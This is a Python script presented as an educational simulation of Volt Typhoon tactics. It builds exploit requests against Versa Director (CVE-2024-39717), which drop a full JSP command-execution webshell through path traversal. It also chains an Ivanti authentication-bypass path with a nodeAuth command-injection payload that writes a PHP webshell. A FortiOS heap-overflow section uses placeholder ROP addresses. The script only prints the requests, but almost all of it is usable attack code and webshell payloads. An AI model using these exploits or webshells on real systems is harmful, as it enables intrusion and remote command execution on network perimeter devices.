# Volt Typhoon Webshell Dropper
# Demonstrates exploitation of network appliances and webshell deployment
# MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell)

# For educational and research purposes only
# Author: Nour A
# Reference: CVE-2024-39717 (Versa Director), CVE-2024-21887 (Ivanti)

import socket
import ssl
import http.client
import urllib.parse
import hashlib
import base64
import struct
import os
import sys
import json
from datetime import datetime


class VersaDirectorExploit:
    """CVE-2024-39717 - Versa Director Arbitrary File Upload
    Volt Typhoon exploited a file upload vulnerability in Versa Director
    (used by ISPs/MSPs) to deploy custom webshells.
    """

    def __init__(self, target_host, target_port=443):
        self.target = target_host
        self.port = target_port
        self.session_cookie = None

    def craft_multipart_upload(self, filename, content, boundary=None):
        """Craft a multipart/form-data payload for the file upload exploit.
        The vulnerability allows uploading files to arbitrary paths via
        the /versa/app/upload endpoint by manipulating the destPath parameter.
        """
        if boundary is None:
            boundary = hashlib.md5(os.urandom(16)).hexdigest()

        body = f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        body += "Content-Type: application/octet-stream\r\n\r\n"
        body += content
        body += f"\r\n--{boundary}--\r\n"

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1",  # bypass IP restrictions
        }
        if self.session_cookie:
            headers["Cookie"] = self.session_cookie

        return headers, body

    def build_exploit_request(self):
        """Build the HTTP request to exploit CVE-2024-39717.
        The vuln allows path traversal in the upload destination.
        """
        # JSP webshell payload
        webshell = self.generate_jsp_webshell()

        # path traversal to drop webshell in web root
        upload_path = "/versa/app/upload"
        dest_path = "../../../../var/versa/vnms/web/custom_logo/"

        params = urllib.parse.urlencode({
            "destPath": dest_path,
            "fileName": "custom_logo.jsp"
        })

        full_path = f"{upload_path}?{params}"
        headers, body = self.craft_multipart_upload("custom_logo.jsp", webshell)

        return {
            "method": "POST",
            "path": full_path,
            "headers": headers,
            "body": body
        }

    def generate_jsp_webshell(self):
        """Generate a JSP webshell similar to what Volt Typhoon deployed."""
        return """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p;
    if (System.getProperty("os.name").toLowerCase().contains("win")) {
        p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
    } else {
        p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    }
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    BufferedReader err = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = err.readLine()) != null) {
        out.println("[ERR] " + line);
    }
}
%>"""

    def simulate_exploit(self):
        """Run the exploit simulation (does not connect to real targets)"""
        print(f"  [+] Target: {self.target}:{self.port}")
        req = self.build_exploit_request()
        print(f"  [+] Method: {req['method']}")
        print(f"  [+] Path: {req['path']}")
        print(f"  [+] Content-Length: {req['headers']['Content-Length']}")
        print(f"  [+] Webshell would be deployed to:")
        print(f"      /var/versa/vnms/web/custom_logo/custom_logo.jsp")
        return req


class IvantiExploit:
    """CVE-2024-21887 - Ivanti Connect Secure Command Injection
    Volt Typhoon chained this with CVE-2023-46805 (auth bypass) for RCE.
    """

    def __init__(self, target_host, target_port=443):
        self.target = target_host
        self.port = target_port

    def build_auth_bypass(self):
        """CVE-2023-46805 - Authentication Bypass via path traversal.
        The /api/v1/totp/user-backup-code/../../system/maintenance/archiving
        endpoint allows unauthenticated access to admin functions.
        """
        path = "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection"
        return path

    def build_command_injection(self, command):
        """CVE-2024-21887 - Command Injection in admin web interface.
        The nodeAuth parameter is vulnerable to OS command injection.
        """
        encoded_cmd = base64.b64encode(command.encode()).decode()
        payload = {
            "type": "1",
            "txtGCPProject": "",
            "txtGCPServiceAccountCredential": "",
            "txtGCPBucketName": "",
            "authType": "rsa",
            "nodeAuth": f';echo {encoded_cmd}|base64 -d|sh;#'
        }
        return json.dumps(payload)

    def generate_exploit_chain(self):
        """Generate the full exploit chain: auth bypass + RCE"""
        webshell_cmd = (
            "echo '<?php system($_GET[\"cmd\"]); ?>' > "
            "/home/webserver/htdocs/dana-na/imgs/shell.php"
        )
        path = self.build_auth_bypass()
        body = self.build_command_injection(webshell_cmd)

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Connection": "close"
        }

        return {
            "method": "POST",
            "path": path,
            "headers": headers,
            "body": body,
            "description": "Auth bypass (CVE-2023-46805) + RCE (CVE-2024-21887)"
        }


class FortinetExploit:
    """CVE-2022-42475 - FortiOS SSL-VPN Heap Overflow
    Volt Typhoon leveraged this FortiGate vulnerability for initial access.
    """

    def __init__(self, target_host, target_port=443):
        self.target = target_host
        self.port = target_port

    def craft_overflow_payload(self):
        """Craft heap overflow trigger for FortiOS sslvpnd."""
        # the vulnerability is in the HTTP request handling of sslvpnd
        # a crafted Content-Length triggers heap overflow
        path = "/remote/logincheck"
        overflow_size = 0x20000  # trigger size

        payload = b"A" * overflow_size
        # ROP gadget addresses (architecture dependent, placeholders)
        rop_chain = struct.pack("<Q", 0x0040dead)  # placeholder gadget
        rop_chain += struct.pack("<Q", 0x0040beef)
        rop_chain += struct.pack("<Q", 0x0040cafe)

        return {
            "path": path,
            "overflow_size": overflow_size,
            "rop_chain_len": len(rop_chain),
            "description": "FortiOS sslvpnd heap overflow (CVE-2022-42475)"
        }


def main():
    print("=" * 70)
    print("VOLT TYPHOON APPLIANCE EXPLOITATION & WEBSHELL DEPLOYMENT")
    print("Network Perimeter Device Exploitation Simulation")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    # Versa Director exploit
    print("[EXPLOIT 1] CVE-2024-39717 - Versa Director File Upload")
    print("-" * 50)
    versa = VersaDirectorExploit("target.example.com")
    versa.simulate_exploit()
    print()

    # Ivanti exploit chain
    print("[EXPLOIT 2] CVE-2023-46805 + CVE-2024-21887 - Ivanti Chain")
    print("-" * 50)
    ivanti = IvantiExploit("vpn.example.com")
    chain = ivanti.generate_exploit_chain()
    print(f"  [+] Auth Bypass Path: {chain['path'][:60]}...")
    print(f"  [+] Injection Method: nodeAuth parameter")
    print(f"  [+] Chain: {chain['description']}")
    body = json.loads(chain["body"])
    print(f"  [+] Payload: {body['nodeAuth'][:50]}...")
    print()

    # Fortinet exploit
    print("[EXPLOIT 3] CVE-2022-42475 - FortiOS Heap Overflow")
    print("-" * 50)
    forti = FortinetExploit("fw.example.com")
    info = forti.craft_overflow_payload()
    print(f"  [+] Target endpoint: {info['path']}")
    print(f"  [+] Overflow size: {info['overflow_size']} bytes")
    print(f"  [+] ROP chain length: {info['rop_chain_len']} bytes")
    print()

    print("=" * 70)
    print("[+] EXPLOITATION DEMONSTRATION COMPLETE")
    print("  Techniques shown:")
    print("  - Arbitrary file upload via path traversal")
    print("  - Authentication bypass + command injection chaining")
    print("  - Heap overflow with ROP chain construction")
    print("  - JSP/PHP webshell deployment to web roots")
    print("=" * 70)


if __name__ == "__main__":
    main()
